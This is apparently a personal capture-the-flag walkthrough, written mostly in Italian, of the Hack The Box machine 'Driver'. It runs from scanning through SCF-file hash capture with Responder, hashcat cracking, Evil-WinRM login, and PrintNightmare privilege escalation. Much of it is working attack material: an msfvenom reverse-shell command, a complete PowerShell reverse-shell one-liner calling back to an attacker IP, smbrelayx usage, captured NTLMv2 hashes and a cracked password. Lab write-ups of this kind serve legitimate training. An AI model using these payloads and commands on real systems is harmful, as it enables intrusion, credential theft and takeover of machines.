@@ -1,0 +1,324 @@
+10.10.11.106
+
+
+sudo masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.11.106
+
+Discovered open port 80/tcp on 10.10.11.106
+Discovered open port 445/tcp on 10.10.11.106
+Discovered open port 5985/tcp on 10.10.11.106
+Discovered open port 135/tcp on 10.10.11.106
+
+nmap -sC -sV -p80,445,5985,135 10.10.11.106
+
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+135/tcp  open  msrpc        Microsoft Windows RPC
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h02m19s, deviation: 0s, median: 7h02m18s
+| smb-security-mode:
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-12-11T19:11:01
+|_  start_date: 2021-12-11T19:07:33
+
+
+
+
+
+
+con smbclient non riesco ad accedere alla porta 445, ho logon failure, posso riprovare poi se avrò delle credenziali
+controllo il sito sulla porta 80
+
+mi richiede subito autenticazione (Basic):
+
+“MFP Firmware Update Center. Please enter password for admin”
+
+sono riuscito ad entrare con admin:admin
+
+
+
+http://10.10.11.106/fw_up.php
+Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.
+
+
+devo caricare un file con una reverse shell all'interno?
+
+posso scegliere printer model:
+
+<option value="HTB DesignJet">HTB DesignJet</option>
+ <option value="HTB Ecotank">HTB Ecotank</option>
+ <option value="HTB Laserjet Pro">HTB Laserjet Pro</option>
+ <option value="HTB Mono">HTB Mono</option>
+
+
+ ho provato a caricare un file prova.txt e me lo ha fatto caricare
+
+ dice che li caricano sui loro file shares, ma con smb non reisco ad accedere provo a vedere se riesco a trovare qualche directory dove vengono salvati questi files:
+
+ sudo gobuster  dir -u http://10.10.11.106/ -w /usr/share/wordlists/dirb/big.txt -t 200
+
+ /Images               (Status: 301) [Size: 150] [--> http://10.10.11.106/Images/]
+ /images               (Status: 301) [Size: 150] [--> http://10.10.11.106/images/]
+
+niente di interessante
+
+
+vedo con burp se viene mandato qualche dato interessante nella richiesta a questa pagina, magari si può sfruttare qualcosa
+
+
+POST /fw_up.php?msg=SUCCESS HTTP/1.1
+Host: 10.10.11.106
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------259185057211166413042067574249
+Content-Length: 364
+Origin: http://10.10.11.106
+Authorization: Basic YWRtaW46YWRtaW4=
+Connection: close
+Referer: http://10.10.11.106/fw_up.php?msg=SUCCESS
+Upgrade-Insecure-Requests: 1
+
+-----------------------------259185057211166413042067574249
+Content-Disposition: form-data; name="printers"
+
+HTB DesignJet
+-----------------------------259185057211166413042067574249
+Content-Disposition: form-data; name="firmware"; filename="prova.txt"
+Content-Type: text/plain
+
+prova prova
+
+-----------------------------259185057211166413042067574249--
+
+
+a quanto pare però scriv eil contenuto del file nella request, considerando che la pagina è php posso sfruttare questa cosa?
+
+
+
+l'unica cosa che mi può essere utile è il fatto che questi file vengono messi in un smb share
+
+https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+
+1) creo il file .scf:
+  exploit.scf
+2) creo il payload con msfvenom:
+  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=4444 -f exe -o rev_shell.exe
+3) metto su il listener (nc -lvnp 4444)
+4)faccio partire impacket:
+  sudo python3 smbrelayx.py -h 10.10.11.106 -e /home/daerves/Scrivania/git/SecNotes/htb/done/driver/rev_shell.exe
+5) carico il file sul sito sperando che venga caricato in smb e aperto
+
+
+
+[*] SMBD: Received connection from 10.10.11.106, attacking target 10.10.11.106
+[-] Authenticating against 10.10.11.106 as DRIVER\tony FAILED
+
+
+ottengo la connessione quindi il file scf funziona
+però non riesce ad autenticarsi come DRIVER\tony
+
+
+posso provare a settare il listener con responder per prendere gli hash e vedere se poi riesco ad usarli in qualche altro modo:
+
+sudo responder -wrf --lm -v -I tun0
+
+[SMB] NTLMv2 Client   : 10.10.11.106
+[SMB] NTLMv2 Username : DRIVER\tony
+[SMB] NTLMv2 Hash     : tony::DRIVER:bcceab16b76f6830:F69E01828357EF94EE1930416FC0DFBB:01010000000000001D2AEF30CAEED7012DC636C31A7DC4EF00000000020000000000000000000000
+[SMB] NTLMv2 Client   : 10.10.11.106
+[SMB] NTLMv2 Username : DRIVER\tony
+[SMB] NTLMv2 Hash     : tony::DRIVER:9bdf5be1baf50dc6:5F8F0A0C8AB6D7B04CA0F96C1AB64070:0101000000000000C021A931CAEED701B018A91C4CC12D5D00000000020000000000000000000000
+[SMB] NTLMv2 Client   : 10.10.11.106
+[SMB] NTLMv2 Username : DRIVER\tony
+[SMB] NTLMv2 Hash     : tony::DRIVER:8090ac9e592377af:30DCE9DF6BFC4B3001259114832BB1B1:0101000000000000AC7A6532CAEED701C00D76D1C0D0207600000000020000000000000000000000
+[SMB] NTLMv2 Client   : 10.10.11.106
+[SMB] NTLMv2 Username : DRIVER\tony
+[SMB] NTLMv2 Hash     : tony::DRIVER:350c65bbce103616:BC75AA854F48ED34D1F1F978EFA6D01E:010100000000000064AF1A33CAEED701473FDB4355964D1400000000020000000000000000000000
+[SMB] NTLMv2 Client   : 10.10.11.106
+[SMB] NTLMv2 Username : DRIVER\tony
+[SMB] NTLMv2 Hash     : tony::DRIVER:55ace63e58cc8533:5FB6A175A848E7BBB289DBEE20FEE38D:01010000000000004B43D233CAEED70100CD083CBDBB01F300000000020000000000000000000000
+[SMB] NTLMv2 Client   : 10.10.11.106
+[SMB] NTLMv2 Username : DRIVER\tony
+[SMB] NTLMv2 Hash     : tony::DRIVER:a3d391502169a169:2A0FADB5F08A43C2F232D220473B8DEA:010100000000000092DE8934CAEED7017C5DF853FA44EC8100000000020000000000000000000000
+[SMB] NTLMv2 Client   : 10.10.11.106
+[SMB] NTLMv2 Username : DRIVER\tony
+[SMB] NTLMv2 Hash     : tony::DRIVER:b4942ed27a5e8c99:AD0D229B1E444EA2963935F3CC2511E3:0101000000000000310B3F35CAEED701030D6ACFE18A4B9F00000000020000000000000000000000
+
+
+provo a crackare usando hashcat
+
+hashcat -a 0 -m 5600 hash_tony.txt /usr/share/wordlists/rockyou.txt
+
+
+TONY::DRIVER:b4942ed27a5e8c99:ad0d229b1e444ea2963935f3cc2511e3:0101000000000000310b3f35caeed701030d6acfe18a4b9f00000000020000000000000000000000:liltony
+
+
+tony:liltony
+
+
+posso provare ad accedere con evil-winrm
+
+
+*Evil-WinRM* PS C:\Users\tony\Desktop> whoami
+driver\tony
+*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
+1566315c6fd124d7b1687920d8911a5a
+
+
+smbclient -L //10.10.11.106 -U tony
+Enter WORKGROUP\tony's password:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+
+
+  smbmap -u tony -p liltony -d DRIVER -H 10.10.11.106
+  [+] IP: 10.10.11.106:445	Name: 10.10.11.106
+          Disk                                                  	Permissions	Comment
+  	----                                                  	-----------	-------
+  	ADMIN$                                            	NO ACCESS	Remote Admin
+  	C$                                                	NO ACCESS	Default share
+  	IPC$                                              	READ ONLY	Remote IPC
+non sembrano esserci cose interessanti su smb
+
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/16/2021  12:48 PM                Administrator
+d-----        9/28/2021  12:13 PM                DefaultAppPool
+d-r---        6/11/2021   7:06 AM                Public
+d-----        9/10/2021   8:23 AM                tony
+
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+
+
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes
+====================================== ================ ============ ==================================================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+
+
+
+*Evil-WinRM* PS C:\temp\z87179L19\misc> dir -force
+
+
+    Directory: C:\temp\z87179L19\misc
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         7/2/2019   4:30 PM           2425 izon.zip
+
+
+l'ho scaricato, i file all'interno sono file di installazione di driver ricoh per stampanti
+
+
+https://www.rapid7.com/db/modules/exploit/windows/local/ricoh_driver_privesc/
+
+su molti di questi driver è possibile fare privesc
+https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/
+
+
+
+posso usare lo script exploit_ricoh oppure per fare piu velocemente posso usare metasploit.
+
+per prima cosa devo creare una sessione come tony da usare nell'exploit per ricoh visto che ora la tengo esterna a metasploit
+
+
+$client = New-Object System.Net.Sockets.TCPClient("10.10.16.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path
++ "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+grazie a questo comando sono riuscito a portare una rev shell su metasploit
+
+
+ma non riesco comunque quindi metasploit non va bene in questo caso
+
+ho aperto shell meterpreter su metasploit eseguendo un payload .exe di msfvenom direttamente sulla macchina
+
+
+
+[*] 10.10.11.106 - Collecting local exploits for x64/windows...
+[*] 10.10.11.106 - 28 exploit checks are being tried...
+[+] 10.10.11.106 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
+[+] 10.10.11.106 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
+[+] 10.10.11.106 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
+[+] 10.10.11.106 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
+[+] 10.10.11.106 - exploit/windows/local/ricoh_driver_privesc: The target appears to be vulnerable. Ricoh driver directory has full permissions
+[+] 10.10.11.106 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
+[*] Post module execution completed
+
+
+purtroppo eseguendoli non funzionano
+
+quindi devo provare a mano
+
+
+
+
+dai processi in esecuzione vedpo il servizio spoolsv per cui si può applicare printernightmare:
+
+
+
+https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html
+
+*Evil-WinRM* PS C:\Users\tony\Documents> copy \\10.10.16.5\share\CVE-2021-1675.ps1 .
+*Evil-WinRM* PS C:\Users\tony\Documents> Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;             //perchè non faceva eseguire script.ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> Import-Module ./CVE-2021-1675.ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser "daerves" -NewPassword "daerves"
+
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+3e5d4cadfb39aeeed458671fa3c3210a
